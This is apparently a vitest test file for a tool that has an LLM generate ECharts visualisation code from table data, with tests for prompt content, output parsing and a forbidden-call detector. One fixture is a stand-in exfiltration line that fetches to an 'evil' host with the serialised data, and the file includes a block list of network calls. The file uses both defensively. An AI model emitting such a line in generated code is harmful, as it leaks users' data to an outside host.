import { describe, it, expect, vi, beforeEach } from 'vitest'

const mockCreate = vi.fn()
vi.mock('openai', () => ({ default: class { chat = { completions: { create: mockCreate } } } }))

const { generateViz, hasForbiddenCalls } = await import('./dataviz')
const { DEFAULT_SETTINGS } = await import('../types')

const settings = { ...DEFAULT_SETTINGS, openaiBaseUrl: 'https://api.example.com/v1', openaiApiKey: 'sk', openaiModel: 'gpt-4o' }
const input = {
  schema: [{ name: '地区', type: 'Text' }, { name: '销量', type: 'Number' }],
  sampleRows: [{ 地区: '华东', 销量: '10' }],
  request: '按地区做柱状图',
}
const reply = (content: string) => mockCreate.mockResolvedValue({ choices: [{ message: { content } }] })

describe('hasForbiddenCalls', () => {
  it('flags network / import calls, allows clean ECharts code', () => {
    expect(hasForbiddenCalls('const x = fetch("/a")')).toBe(true)
    expect(hasForbiddenCalls('import foo from "bar"')).toBe(true)
    expect(hasForbiddenCalls('new WebSocket("ws://x")')).toBe(true)
    expect(hasForbiddenCalls('chart.setOption({ series: [{ type: "bar" }] })')).toBe(false)
  })
})

describe('generateViz', () => {
  beforeEach(() => mockCreate.mockReset())

  it('parses {title, code} and sends schema + sample + request', async () => {
    reply(JSON.stringify({ title: '地区销量', code: 'chart.setOption({})' }))
    const r = await generateViz(settings, input)
    expect(r.name).toBe('地区销量')
    expect(r.code).toContain('setOption')
    const sent = (mockCreate.mock.calls[0][0] as { messages: { content: string }[] }).messages[0].content
    expect(sent).toContain('地区')
    expect(sent).toContain('按地区做柱状图')
  })

  it('prompts for all (read-only) app kinds — no data-entry / write-back', async () => {
    reply(JSON.stringify({ title: 'T', code: 'chart.setOption({})' }))
    await generateViz(settings, input)
    const sent = (mockCreate.mock.calls[0][0] as { messages: { content: string }[] }).messages[0].content
    for (const kind of ['图表看板', '计算器', '打印', '幻灯片', '视图']) expect(sent).toContain(kind)
    // The 录入表单 kind + sandbox write-back bridge were removed — the generator is read-only.
    expect(sent).not.toContain('录入表单')
    expect(sent).not.toContain('feishu.createRecords')
  })

  it('strips ```json fences from the output', async () => {
    reply('```json\n{"title":"T","code":"chart.setOption({})"}\n```')
    expect((await generateViz(settings, input)).name).toBe('T')
  })

  it('refine (previousCode) sends an EDIT prompt that hands back the code and forbids touching other charts', async () => {
    reply(JSON.stringify({ title: 'T', code: 'chart.setOption({})' }))
    await generateViz(settings, { ...input, previousCode: 'var A=echarts.init(x); A.setOption({UNIQUE_MARKER:1})' })
    const sent = (mockCreate.mock.calls[0][0] as { messages: { content: string }[] }).messages[0].content
    expect(sent).toContain('UNIQUE_MARKER')   // the current code is handed back to edit
    expect(sent).toContain('逐字保留')          // keep untouched charts identical
    expect(sent).toContain('最小改动')
  })

  it('rejects forbidden network calls in the generated code', async () => {
    reply(JSON.stringify({ title: 'T', code: 'fetch("https://evil/?d="+JSON.stringify(data))' }))
    await expect(generateViz(settings, input)).rejects.toThrow(/被禁止/)
  })

  it('throws on non-JSON output', async () => {
    reply('就是一段普通文字，不是 JSON')
    await expect(generateViz(settings, input)).rejects.toThrow(/JSON/)
  })
})
